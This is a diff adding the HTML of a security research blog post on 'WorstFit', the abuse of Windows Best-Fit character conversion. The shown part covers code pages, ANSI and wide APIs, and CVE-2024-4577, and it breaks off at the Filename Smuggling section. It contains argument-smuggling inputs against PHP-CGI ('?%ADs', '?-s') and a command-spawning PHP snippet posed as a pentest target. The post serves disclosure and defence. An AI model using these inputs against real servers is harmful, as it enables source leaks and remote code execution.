@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+
+    
+      <meta name="description" content="📌 This is a cross-post from DEVCORE. The research was first published at Black Hat Europe 2024. Personally, I would like to thank splitline, the co-author of this research &amp; article, whose help">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WorstFit: Unveiling Hidden Transformers in Windows ANSI!">
+<meta property="og:url" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="📌 This is a cross-post from DEVCORE. The research was first published at Black Hat Europe 2024. Personally, I would like to thank splitline, the co-author of this research &amp; article, whose help">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab5a.jpg">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab2e.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/e330dc0d5ca8487bae61ecd08.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab57.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab07.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab0a.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab11.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab48.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab4f.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab51.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab52.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab34.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab1a.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab1b.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab36.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab18.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab56.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab12.png">
+<meta property="article:published_time" content="2025-01-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-03T06:29:22.764Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab5a.jpg">
+    
+
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>WorstFit: Unveiling Hidden Transformers in Windows ANSI! | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <a class="u-url u-uid" href="/"> <h1 class="p-name">Orange Tsai</h1> </a>
+    </div>
+  
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        WorstFit: Unveiling Hidden Transformers in Windows ANSI!
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-09T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-01-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab5a.jpg" alt="preview"></p>
+<p><em>📌 This is a cross-post from <a target="_blank" rel="noopener" href="https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi">DEVCORE</a>. The research was first published at <a target="_blank" rel="noopener" href="https://www.blackhat.com/eu-24/briefings/schedule/index.html#worstfit-unveiling-hidden-transformers-in-windows-ansi-42637">Black Hat Europe 2024</a>. Personally, I would like to thank <a target="_blank" rel="noopener" href="https://x.com/_splitline_">splitline</a>, the co-author of this research &amp; article, whose help and idea were invaluable. Please also give him a big shout-out!</em></p>
+<style>
+  blink {
+  animation: blinker 1s linear infinite;
+}
+
+@keyframes blinker {
+  50% {
+    opacity: 0.2;
+  }
+}
+</style>
+
+
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><blockquote>
+<p>The research unveils a new attack surface in Windows by exploiting <strong>Best-Fit</strong>, an internal charset conversion feature. Through our work, we successfully transformed this feature into several practical attacks, including Path Traversal, Argument Injection, and even RCE, affecting numerous well-known applications!<br>&nbsp;<br>Given that the root cause spans compiler behavior, C&#x2F;C++ runtime and developer’s mistakes, we also discussed the challenges of pushing fixes within the open-source ecosystem.<br>&nbsp;<br>Get the latest update and <blink><a target="_blank" rel="noopener" href="https://worst.fit/assets/EU-24-Tsai-WorstFit-Unveiling-Hidden-Transformers-in-Windows-ANSI.pdf">slides</a></blink> on our website!🔥 → <a target="_blank" rel="noopener" href="https://worst.fit/">https://worst.fit/</a></p>
+</blockquote>
+<hr>
+<p>Let’s imagine that: you’re a pentester, and your target website is running the following code. Can you pop a <code>calc.exe</code> with that? <!-- You can have a quick try on your own. --></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$url</span> = <span class="string">&quot;https://example.tld/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>] . <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&quot;wget.exe -q &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>));</span><br></pre></td></tr></table></figure>
+
+<p>You can have a quick try on your own. The PHP code uses a secure way to spawn the command. Looks a bit hard, right?</p>
+<p>Well, today, we would like to present a new technique to break through it!</p>
+<h2 id="Outline"><a href="#Outline" class="headerlink" title="Outline"></a>Outline</h2><ul>
+<li><a href="#outline">Outline</a></li>
+<li><a href="#Decoding-the-Windows-Encodings">Decoding the Windows Encodings</a><ul>
+<li><a href="#The-Early-Days-ANSI-and-Code-Pages">The Early Days: ANSI and Code Pages</a></li>
+<li><a href="#The-Unicode-Era-UTF-16">The Unicode Era: UTF-16</a></li>
+<li><a href="#The-Dual-Era-of-Encoding">The Dual Era of Encoding</a></li>
+</ul>
+</li>
+<li><a href="#It-was-the-Best-of-Fit">It was the Best of Fit</a></li>
+<li><a href="#It-was-the-Worst-of-Fit-%E2%80%93-The-novel-attack-surface-on-Windows">It was the Worst of Fit – The novel attack surface on Windows</a><ul>
+<li><a href="#%F0%9F%94%A5-The-nightmare-of-East-Asia-CVE-2024-4577">🔥 The nightmare of East-Asia - CVE-2024-4577</a></li>
+<li><a href="#%F0%9F%94%A5-Filename-Smuggling">🔥 Filename Smuggling</a></li>
+<li><a href="#%F0%9F%94%A5-Argument-Splitting">🔥 Argument Splitting</a></li>
+<li><a href="#-environment-variable-confusion">🔥 Environment Variable Confusion</a></li>
+</ul>
+</li>
+<li><a href="#The-Dusk%E2%80%93or-Dawn%E2%80%93of-the-WorstFit">The Dusk–or Dawn–of the WorstFit</a></li>
+<li><a href="#Epilogue">Epilogue</a><ul>
+<li><a href="#Mitigations">Mitigations</a></li>
+<li><a href="#Conclusion">Conclusion</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="Decoding-the-Windows-Encodings"><a href="#Decoding-the-Windows-Encodings" class="headerlink" title="Decoding the Windows Encodings"></a>Decoding the Windows Encodings</h2><p>If you are a Windows user, you’re probably aware that the Windows operating system supports Unicode. This means we can seamlessly put emojis ✅, áccènted letters, 𝒻𝒶𝓃𝒸𝓎 𝕤𝕪𝕞𝕓𝕠𝕝𝕤 and CJK <abbr title="CHARACTERS">匚卄八尺八匚ㄒヨ尺丂</abbr> pretty much anywhere — like file names, file contents, or even environment variables. But have you ever wondered how Windows manages to handle those non-ASCII characters?</p>
+<p>Well, to describe this, let’s dive into the history of encoding in Windows first to understand how it handles.</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab2e.png"></p>
+<h3 id="The-Early-Days-ANSI-and-Code-Pages"><a href="#The-Early-Days-ANSI-and-Code-Pages" class="headerlink" title="The Early Days: ANSI and Code Pages"></a>The Early Days: ANSI and Code Pages</h3><table>
+<thead>
+<tr>
+<th><strong>Code Page</strong></th>
+<th><strong>Language</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1250</td>
+<td>Central &#x2F; Eastern European languages (e.g., Polish, Czech)</td>
+</tr>
+<tr>
+<td>1251</td>
+<td>Cyrillic-based languages (e.g., Russian, Bulgarian)</td>
+</tr>
+<tr>
+<td>1252</td>
+<td>Western European languages (e.g., English, German, French)</td>
+</tr>
+<tr>
+<td>1253</td>
+<td>Greek</td>
+</tr>
+<tr>
+<td>1254</td>
+<td>Turkish</td>
+</tr>
+<tr>
+<td>1255</td>
+<td>Hebrew</td>
+</tr>
+<tr>
+<td>1256</td>
+<td>Arabic</td>
+</tr>
+<tr>
+<td>1257</td>
+<td>Baltic languages (e.g., Estonian, Latvian, Lithuanian)</td>
+</tr>
+<tr>
+<td>1258</td>
+<td>Vietnamese</td>
+</tr>
+<tr>
+<td>932</td>
+<td>Japanese</td>
+</tr>
+<tr>
+<td>936</td>
+<td>Simplified Chinese</td>
+</tr>
+<tr>
+<td>949</td>
+<td>Korean</td>
+</tr>
+<tr>
+<td>950</td>
+<td>Traditional Chinese</td>
+</tr>
+<tr>
+<td>874</td>
+<td>Thai</td>
+</tr>
+</tbody></table>
+<p>Windows initially used ANSI encoding, which relied on code pages such as the one shown above. It used 8 to 16 bits to represent a single character. While these mappings were effective for certain languages, they were unable to accommodate mixed or universal character sets.</p>
+<p>For instance, back in the day, as a Taiwanese, if my Japanese friend sent me an article written on their Windows computer, I’d probably end up with a scrambled mess of <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Mojibake">mojibake</a> because my code page 950 system couldn’t properly interpret the Japanese 932 code page.</p>
+<p>To handle different encoding needs, Windows doesn’t rely on just one type of code page — there are actually two:</p>
+<ul>
+<li><strong>ACP</strong> (ANSI Code Page): Used for most applications and system settings, such as file operations or managing environment variables. Our research here primarily focuses on this type of code page, as it significantly impacts the scenarios we’ll examine.</li>
+<li><strong>OEMCP</strong> (Original Equipment Manufacturer Code Page): Mainly used for device communication, such as reading or writing to the console.</li>
+</ul>
+<p>To check which ACP (ANSI code page) you’re using, consider these methods:</p>
+<ol>
+<li><strong>Using PowerShell</strong>   <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe [<span class="type">Console</span>]::OutputEncoding.WindowsCodePage</span><br></pre></td></tr></table></figure></li>
+<li><strong>From the Registry</strong>   <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\CodePage /v ACP</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>Additionally, you might also heard of <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp"><code>chcp</code></a>. However, be aware that <code>chcp</code> displays the <strong>OEMCP</strong>  rather than the ACP, which is the focus of our research here.</p>
+<h3 id="The-Unicode-Era-UTF-16"><a href="#The-Unicode-Era-UTF-16" class="headerlink" title="The Unicode Era: UTF-16"></a>The Unicode Era: UTF-16</h3><p>To address the limitations of code pages, Windows transitioned to Unicode in the mid-1990s. Unlike code pages, Unicode could represent characters from nearly all languages in a single standard.</p>
+<p>Initially, Windows used UCS-2 for Unicode but soon upgraded to <strong>UTF-16</strong>, which uses 16 bits for most characters and expands to 32 bits for rarer ones (e.g., emojis, ancient scripts). Windows also switched to <strong>wide characters</strong> for core APIs like file systems, system information, and text processing.</p>
+<p>Now you might be wondering: Hey, what about the most popular Unicode encoding nowadays: <strong>UTF-8</strong>? Well, it’s already there, but still in a sort of beta phase. For most languages, the UTF-8 feature sadly isn’t enabled by default.</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/e330dc0d5ca8487bae61ecd08.png"></p>
+<h3 id="The-Dual-Era-of-Encoding"><a href="#The-Dual-Era-of-Encoding" class="headerlink" title="The Dual Era of Encoding"></a>The Dual Era of Encoding</h3><p>Even though Unicode became the backbone of Windows, Windows still needs to do what they always do: backward compatible. They still need to support the old ANSI code pages. To achieve this, Windows implemented two different versions of APIs:</p>
+<ul>
+<li><strong>ANSI APIs</strong>: A Windows code page version with the letter “A” postfix used to indicate “ANSI”. For example, <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea"><code>GetEnvironmentVariableA</code></a> function.</li>
+<li><strong>Unicode APIs</strong>: A Unicode version with the letter “W” postfix used to indicate “wide (character)”. For example, <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablew"><code>GetEnvironmentVariableW</code></a> function.</li>
+</ul>
+<p>This approach allows developers to easily obtain their desired data format by simply switching between the A-postfix and W-postfix APIs.</p>
+<p>It sounds perfect – But wait, so how can a wide character UTF-16 string also be in the ANSI format? Aren’t they fundamentally different?</p>
+<p>To illustrate this, let’s explore an example. Imagine we’re on an English (<strong>Windows-1252</strong> code page) system with an environment variable <code>ENV=Hello</code> stored in the system. The data is internally stored as <strong>UTF-16</strong> (wide character format), but we can retrieve it using both Unicode and ANSI APIs:</p>
+<ul>
+<li><strong>Unicode API</strong>: <code>GetEnvironmentVariableW(L&quot;ENV&quot;)</code> ⭢ <code>L&quot;Hello&quot;</code> (Hex: <code>4800 6500 6C00 6C00 6F00</code> in UTF-16LE).  </li>
+<li><strong>ANSI API</strong>: <code>GetEnvironmentVariableA(&quot;ENV&quot;)</code> — <code>RtlUnicodeStringToAnsiString</code> ⭢ <code>&quot;Hello&quot;</code> (Hex: <code>48 65 6C 6C 6F</code> in ANSI).</li>
+</ul>
+<p>For the <strong>Unicode API</strong>, there’s no problem—Unicode in, Unicode out, with no conversion needed. For the <strong>ANSI API</strong>, Windows applies an implicit conversion by calling <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-rtlunicodestringtoansistring"><code>RtlUnicodeStringToAnsiString</code></a> (or sometimes <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte"><code>WideCharToMultiByte</code></a>) to convert the original Unicode string to an ANSI string. Since <code>&quot;Hello&quot;</code> consists only of ASCII characters, everything works perfectly and as expected. </p>
+<p>But what happens if the environment variable contains a more complex string, like <strong><code>√π⁷≤∞</code></strong>, with a lot of non-ASCII characters?</p>
+<ul>
+<li><strong>Unicode API</strong>: <code>GetEnvironmentVariableW(L&quot;ENV&quot;)</code> ⭢ <code>L&quot;√π⁷≤∞&quot;</code> (Hex: <code>1a22 c003 7720 6422 1e22</code> in UTF-16LE).</li>
+</ul>
+<p>The <strong>Unicode API</strong> correctly returns the original string as we expected. </p>
+<p>Now, what happens with the ANSI API? Are you able to guess the result?</p>
+<ul>
+<li><strong>ANSI API</strong>: <code>GetEnvironmentVariableA(&quot;ENV&quot;)</code> — <code>RtlUnicodeStringToAnsiString</code> ⭢ <code>&quot;vp7=8&quot;</code> (Hex: <code>76 70 37 3D 38</code> in ANSI) 🤯</li>
+</ul>
+<p>Yep, the output is <strong><code>vp7=8</code></strong>. A strange result, right? I guess you can’t even figure out the connection between the original characters and their character codes!</p>
+<p>This bizarre transformation is what’s known as <strong>“Best-Fit”</strong> behavior. As a result, the original string <code>√π⁷≤∞</code> transforms into a nonsensical <code>&quot;vp7=8&quot;</code>. This behavior highlights the pitfalls of relying on ANSI APIs when handling non-ASCII characters.</p>
+<p>And actually, it’s not just when using Windows APIs directly — this behaviour also occurs when using non-wide-character version CRT (C runtime) functions like <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv"><code>getenv</code></a>. Surprisingly, even when you receive arguments or environment variables through a seemingly straightforward non-wide-character <code>main</code> function like:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;test_env = %s\n&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;test_env&quot;</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; argc; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;argv[%d] = %s\n&quot;</span>, i, argv[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The same Best-Fit behavior applies to both the arguments and the environment variables. Here’s what happens when we run this code:</p>
+<p><img src="/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/fb7a21f99453ce05667ddab57.png"></p>
+<p>This happens because, during compilation, the compiler inserts several functions and links the CRT DLLs for you, which internally rely on ANSI Windows APIs. As a result, the same Best-Fit behavior is triggered implicitly.</p>
+<p>We keep talking about Best-Fit, but how does this quirky behavior actually work in the end?</p>
+<h2 id="It-was-the-Best-of-Fit"><a href="#It-was-the-Best-of-Fit" class="headerlink" title="It was the Best of Fit"></a>It was the Best of Fit</h2><p>In Windows, “Best-Fit” character conversion is a way the operating system handles situations where it needs to convert characters from UTF-16 to ANSI, but the exact character doesn’t exist in the target code page. </p>
+<p>For instance, the <code>∞</code> (<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+221E">U+221E</a>) symbol isn’t part of the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Windows-1252#Codepage_layout">Windows-1252 code page</a>, so Microsoft decided to map it to the “<strong>closest</strong>“ character—<code>8</code> (<a target="_blank" rel="noopener" href="https://worst.fit/mapping/#CP%3A1252%20FROM%3A0x221e">🔍</a>). Uh, okay. Yeah I guess they kinda look similar, but I thought they should be still completely different things…</p>
+<p>Anyway, obviously there’s no strict formula for Best-Fit mapping – what Microsoft does is more about making characters look, or even “feel” somewhat alike.</p>
+<p>Also, different language configurations (code pages) handle mappings differently. For instance, the yen sign (<code>U+00A5</code>) is mapped to a backslash (<code>\</code>) on the Japanese (932) code page, to a “Y” on the Central European (1250) code page, and remains unchanged on most other code pages. This variability will play a significant role in how exploits behave across different system settings. </p>
+<p>If you’re curious about the specifics, you can check out our <a target="_blank" rel="noopener" href="https://worst.fit/mapping/">Best-fit Mapping Grepper</a> tool or dive into the raw mapping data on <a target="_blank" rel="noopener" href="https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/readme.txt">Unicode.org</a> by yourself.</p>
+<p>Interestingly, during our research we found that this <strong>Best-Fit</strong> behavior was already mentioned back in Black Hat USA 2009 during Chris Weber’s presentation, <a target="_blank" rel="noopener" href="https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-SLIDES.pdf">“Unicode Security”</a>. However, he only briefly touched on how this feature could be exploited to bypass simple blacklist.</p>
+<p><em>(<strong>Updated</strong>: After this article was published, we learned that <a target="_blank" rel="noopener" href="https://x.com/hasegawayosuke">Yosuke HASEGAWA</a> also mentioned this behavior at <a target="_blank" rel="noopener" href="https://www.blackhat.com/presentations/bh-jp-08/bh-jp-08-Hasegawa/BlackHat-japan-08-Hasegawa-Char-Encoding.pdf">Black Hat Japan 2008</a>, covering part of our Filename Smuggling in Japanese code page.)</em></p>
+<p>But this time, we’re taking big steps forward – showing how those sneaky Best-Fit conversions can operate on a <strong>system-wide level</strong>, leading to even more impactful exploits, all unfolding right under your nose.</p>
+<p>Now, it’s time to turn this quirky behaviour into something more impactful: <strong>real WorstFit vulnerabilities</strong>.</p>
+<h2 id="It-was-the-Worst-of-Fit-–-The-novel-attack-surface-on-Windows"><a href="#It-was-the-Worst-of-Fit-–-The-novel-attack-surface-on-Windows" class="headerlink" title="It was the Worst of Fit – The novel attack surface on Windows"></a>It was the Worst of Fit – The novel attack surface on Windows</h2><p>By delving into the Best-Fit feature, we can harness this unexpected character transformation as a brand-new attack surface on Windows systems. Here, we’ll explore three intriguing attack techniques that exploit this behavior: <strong>Filename Smuggling</strong>, <strong>Argument Splitting</strong> and <strong>Environment Variable Confusion</strong>.</p>
+<p>Let’s dive into each of these techniques to see how this seemingly thoughtful (at least, from Microsoft’s perspective at the time) feature can lead to critical vulnerabilities!</p>
+<h3 id="🔥-The-nightmare-of-East-Asia-CVE-2024-4577"><a href="#🔥-The-nightmare-of-East-Asia-CVE-2024-4577" class="headerlink" title="🔥 The nightmare of East-Asia - CVE-2024-4577"></a>🔥 The nightmare of East-Asia - CVE-2024-4577</h3><p>The first ever WorstFit attack is CVE-2024-4577. This vulnerability allows attackers to compromise any PHP-CGI server configured with Chinese or Japanese code pages using nothing more than a <code>?%ADs</code> request!</p>
+<p>➡️ <strong>Affected Code Pages</strong>: 932 (Japanese), 936 (Simplified Chinese), 950 (Traditional Chinese)<br>➡️ <strong>Threat Characters</strong>: <code>&amp;shy;</code> <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+00AD">U+00AD</a> </p>
+<p>Back in 2012, a vulnerability in PHP-CGI was discovered. The issue stemmed from Apache automatically treating the query string as the first argument for the CGI program. Exploitation was straightforward – argument injection. By appending <code>?-s</code> to a request, attackers could leak the page’s source code. Furthermore, it’s also possible to achieve Remote Code Execution (RCE).</p>
+<p>Of course, PHP quickly patched the issue. The fix was also simple: stop parsing arguments if the query string starts with a dash.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((qs = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;QUERY_STRING&quot;</span>)) != <span class="literal">NULL</span> &amp;&amp; <span class="title function_ invoke__">strchr</span>(qs, <span class="string">&#x27;=&#x27;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">   <span class="comment">/* ... omitted ... */</span></span><br><span class="line">   <span class="keyword">for</span> (p = decoded_qs; *p &amp;&amp; *p &lt;= <span class="string">&#x27; &#x27;</span>; p++) &#123; <span class="comment">/* skip leading spaces */</span> &#125;</span><br><span class="line">   <span class="keyword">if</span> (*p == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">      skip_getopt = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">/* ... omitted ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The patch worked well, and no one broke it for the past 12 years. However, while reviewing the patch, we couldn’t help but feel that this blacklist approach seemed weak. After some quick fuzzing, we discovered a simple bypass: appending <code>?%ADs</code> to the query string effortlessly!</p>
+<p>As investigating more, we discovered that U+00AD (soft hyphen) is mapped to a dash (-) on Chinese (936, 950) and Japanese (932) code pages due to <strong>Best-Fit</strong> behavior, which explains how the bypass works. </p>
+<p>This is the first time we’ve encountered the term “Best-Fit”. We found it super interesting, which motivated us to take a deeper look.</p>
+<h3 id="🔥-Filename-Smuggling"><a href="#🔥-Filename-Smuggling" class="headerlink" title="🔥 Filename Smuggling"></a>🔥 Filename Smuggling</h3><p>The next attack we would like to introduce is the WorstFit in the filename processing. Here, we focus on characters that mapped to either <strong>“&#x2F;“ (0x2F)</strong> or <strong>“\“ (0x5C)</strong>, such as the currency symbol <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Won_sign">Yen (¥)</a>, and <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Yen_and_yuan_sign">Won (₩)</a> used in Japanese and Korean Code Pages, as well as the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_(Unicode_block)">fullwidth</a> version of the (back-)slash in most Code Pages. You can check the affected characters and Code Pages on our <a target="_blank" rel="noopener" href="https://worst.fit/mapping/">Best-fit Mapping Grepper</a> tool!</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://worst.fit/mapping/#to%3A0x2f">Characters mapped to “&#x2F;“ (0x2F)</a></li>
+<li><a target="_blank" rel="noopener" href="https://worst.fit/mapping/#to%3A0x5c">Characters mapped to “\“ (0x5C)</a></li>
+</ul>
